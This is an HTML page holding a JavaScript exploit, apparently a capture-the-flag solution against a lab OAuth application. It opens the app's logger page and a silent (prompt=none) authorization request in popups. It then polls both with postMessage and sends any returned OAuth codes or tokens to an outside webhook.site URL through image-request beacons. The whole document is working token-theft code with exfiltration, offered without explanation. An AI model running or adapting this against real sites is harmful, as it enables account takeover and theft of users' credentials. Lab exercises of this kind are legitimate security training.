<!doctype html>
<meta charset="utf-8">
<script>
const APP = 'https://solo-leveling-3-71a5c40308e4.pwnbox-lab.com';
const IDP = 'https://google-71a5c40308e4.pwnbox-lab.com';
const LEAK = 'https://webhook.site/341d05fe-7e4f-4daa-99a9-9084174bc7d9';
const STATE = Math.random().toString(16).slice(2);

const AUTH = IDP + '/o/oauth2/v2/auth'
  + '?client_id=solo-leveling-3-client'
  + '&redirect_uri=' + encodeURIComponent(APP + '/callback')
  + '&response_type=' + encodeURIComponent('code token')
  + '&scope=' + encodeURIComponent('openid email profile')
  + '&prompt=none'
  + '&state=' + STATE;

function ping(name, value) {
  new Image().src = LEAK + '?' + name + '=' + encodeURIComponent(value == null ? '1' : value);
}

ping('loaded', location.host + location.pathname);
const loggerWin = window.open(APP + '/logger', 'loggerWin', 'width=520,height=420');
ping('logger', loggerWin ? 'open' : 'blocked');
const idpWin = window.open(AUTH, 'idpWin', 'width=520,height=420');
ping('idp', idpWin ? 'open' : 'blocked');

const timer = setInterval(() => {
  for (const w of [loggerWin, idpWin]) {
    if (w) { try { w.postMessage({type:'get'}, '*'); } catch (e) {} }
  }
}, 250);
setTimeout(() => clearInterval(timer), 10000);

window.addEventListener('message', (e) => {
  if (!e.data || e.data.type !== 'loggerData') return;
  let raw = e.data.data;
  let obj;
  try { obj = typeof raw === 'string' ? JSON.parse(raw) : raw; }
  catch (err) { ping('bad', String(raw)); return; }
  if (!obj || !obj.data || String(obj.data).indexOf(STATE) === -1) return;
  ping('d', obj.data);
});
</script>
